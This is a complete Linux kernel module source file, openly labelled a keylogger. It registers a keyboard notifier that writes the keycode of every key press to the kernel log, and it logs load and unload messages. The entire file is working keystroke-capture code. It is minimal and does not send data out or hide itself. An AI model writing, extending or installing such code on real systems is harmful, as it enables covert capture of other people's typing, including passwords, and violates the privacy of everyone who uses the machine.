#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

static int keylogger_notify(struct notifier_block *nblock, unsigned long code,
			    void *_param)
{
	struct keyboard_notifier_param *param = _param;

	if (code == KBD_KEYCODE && param->down) {
		pr_info("Key pressed: %d\n", param->value);
	}

	return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
	.notifier_call = keylogger_notify,
};

static int __init keylogger_init(void)
{
	pr_info("Keylogger module loaded\n");
	register_keyboard_notifier(&keylogger_nb);
	return 0;
}

static void __exit keylogger_exit(void)
{
	unregister_keyboard_notifier(&keylogger_nb);
	pr_info("Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A simple kernel module to log keystrokes");
